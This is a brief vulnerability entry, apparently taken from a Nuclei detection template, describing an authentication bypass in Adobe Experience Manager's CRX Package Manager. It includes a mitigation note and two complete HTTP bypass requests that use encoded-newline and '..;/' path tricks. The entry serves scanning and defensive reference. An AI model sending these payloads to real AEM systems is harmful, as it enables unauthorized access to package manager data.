# Vulnerability: AEM Package Manager - Authentication Bypass
**Classification:** AEM
**Source:** Nuclei Template (`aem-crx-bypass.yaml`)

## Description
Adobe Experience Manager Package Manager is susceptible to a hard to exploit authentication bypass issue. This issue only potentially impacts AEM on-premise or AEM as a Managed Service if default security configurations are removed.

## Secure Mitigation
Adobe recommends AEM customers review access controls for the CRX package manager path: /etc/packages.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /crx/packmgr/list.jsp;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0aa.css?_dc=1615863080856&_charset_=utf-8&includeVersions=true HTTP/1.1
Host: {{Hostname}}
Referer: {{BaseURL}}
Accept-Encoding: gzip, deflate

GET /content/..;/crx/packmgr/list.jsp;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0aa.css?_dc=1615863080856&_charset_=utf-8&includeVersions=true HTTP/1.1
Host: {{Hostname}}
Referer: {{BaseURL}}
Accept-Encoding: gzip, deflate
```

